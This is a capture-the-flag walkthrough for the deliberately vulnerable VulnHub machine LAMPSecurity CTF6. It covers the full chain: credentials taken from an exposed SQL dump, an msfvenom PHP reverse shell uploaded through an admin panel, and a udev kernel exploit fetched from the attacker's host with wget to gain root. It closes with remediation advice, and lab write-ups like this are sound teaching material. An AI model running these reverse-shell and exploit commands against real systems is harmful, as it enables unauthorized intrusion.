# LAMPSecurity: CTF6 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.43.30 |
| **Difficulty** | Medium |
| **OS** | Linux (CentOS / RHEL, kernel 2.6.18) |
| **Goal** | root access |
| **Source** | [HackingArticles](https://www.hackingarticles.in/lampsecurity-ctf6-vulnhub-walkthrough/) |

## Attack Summary

LAMPSecurity CTF6 is a medium-difficulty VulnHub machine built around a LAMP stack running a custom PHP web application. The attack path starts with directory brute-force exposing a publicly accessible SQL dump that leaks admin credentials. Those credentials allow login to an admin panel that permits file uploads. A PHP reverse shell uploaded through the event management form yields an Apache shell. Privilege escalation exploits a known udev local privilege escalation against kernel 2.6.18 (Exploit-DB 8478).

## Methodology

1. Host discovery and full-port service scan
2. Web directory brute-force — discover `/files/` and `/sql/`
3. SQL dump analysis — extract admin credentials
4. Admin panel login and file upload exploitation
5. Meterpreter shell via PHP reverse shell
6. Kernel version enumeration
7. udev local privilege escalation (EDB-8478)

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.43.0/24
```

Target identified at `192.168.43.30`.

```bash
nmap -sV -sT -p- 192.168.43.30
```

![nmap](images/01-nmap.png)

Key finding: Port 80 running an Apache-based PHP web application.

## Step 2: Web Enumeration

```bash
dirb http://192.168.43.30
```

![enumeration](images/02-enum.png)

Discovered directories:
- `/files/` — publicly accessible files
- `/sql/` — database dump files

Browsing to `http://192.168.43.30/sql/db.sql` revealed the full database schema and contents including credentials:

```
admin / adminpass
```

## Step 3: Exploitation — PHP File Upload

Log in to the admin panel at `http://192.168.43.30/admin/` using `admin:adminpass`.

The admin panel includes an event management feature that allows file attachments. Generate a PHP Meterpreter reverse shell:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.43.248 \
  LPORT=4444 \
  -o /root/shell.php
```

Upload `shell.php` through the event creation form. Navigate to `http://192.168.43.30/files/` to confirm the file is accessible.

![exploit](images/03-exploit.png)

Set up the Metasploit listener:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.43.248
set LPORT 4444
exploit
```

Click `shell.php` in the browser to trigger execution. A Meterpreter session opens.

## Step 4: Shell and System Information

```bash
meterpreter > sysinfo
```

![shell](images/04-shell.png)

Key finding: **Kernel 2.6.18-92.el5** — vulnerable to udev local privilege escalation (CVE-2009-1185, EDB-8478).

## Step 5: Privilege Escalation — udev EDB-8478

Drop to a system shell and serve the exploit from the attacker machine:

```bash
meterpreter > shell
cp /usr/share/exploitdb/exploits/linux/local/8478.sh /var/www/html/
python -m SimpleHTTPServer 80
```

On the target, download and prepare the exploit:

```bash
cd /tmp
wget http://192.168.43.248/8478.sh
chmod +x 8478.sh
# Fix Windows line endings if necessary
sed -i -e 's/\r$//' 8478.sh
```

Find the required Netlink PID:

```bash
cat /proc/net/netlink
```

Note the PID (e.g., 376) and execute the exploit:

```bash
./8478.sh 376
whoami
# root
```

![root flag](images/05-root-flag.png)

If the exploit fails on the first attempt, try other PIDs listed in `/proc/net/netlink` until root is achieved.

## Lessons Learned

- Publicly accessible SQL dumps are catastrophic. A single exposed `/sql/db.sql` file handed over all admin credentials without any exploitation.
- Unrestricted file upload in an admin panel leads directly to remote code execution. Uploaded file types must be validated server-side and stored outside the web root.
- Running a kernel from 2008 (2.6.18) in a production environment exposes the system to numerous public exploits.

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed SQL dump via HTTP | Remove `/sql/` from the web root; restrict access via `.htaccess` or web server config |
| Unrestricted file upload | Whitelist allowed MIME types; rename uploaded files; store outside the web root |
| Weak admin credentials | Enforce strong password policy; rotate default credentials |
| Outdated kernel (2.6.18) | Update the OS and kernel to a supported version |
